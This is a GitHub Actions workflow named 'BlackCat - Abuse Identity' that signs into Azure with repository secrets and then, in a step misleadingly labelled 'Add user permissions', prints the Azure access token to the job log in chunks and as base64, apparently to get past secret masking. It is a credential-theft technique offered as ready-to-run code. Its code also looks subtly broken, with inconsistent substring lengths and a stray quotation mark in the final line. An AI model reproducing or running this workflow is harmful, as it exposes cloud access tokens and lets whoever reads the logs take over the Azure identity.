name: BlackCat - Abuse Identity
on: [workflow_dispatch]

permissions:
      id-token: write
      contents: read
      
jobs: 
  ubuntu-latest:
    runs-on: ubuntu-latest
    steps:
      - name: Login to Azure
        uses: Azure/Login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }} 
          enable-AzPSSession: true

      - name: 'Add user permissions'
        uses: azure/powershell@v2
        with:
          inlineScript: |
                $token = (Get-AzAccessToken).token
                write-host $token.substring(1,99)
                write-host $token.substring(100,299)
                write-host $token.substring(300,599)
                write-host $token.substring(600,899)
                write-host $token.substring(900,1199)
                write-host $token.substring(1200,1499)
                write-host $token.substring(1500,1799)
                write-host $token.substring(1800,2000)

                write-host [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($token.substring(1)"))

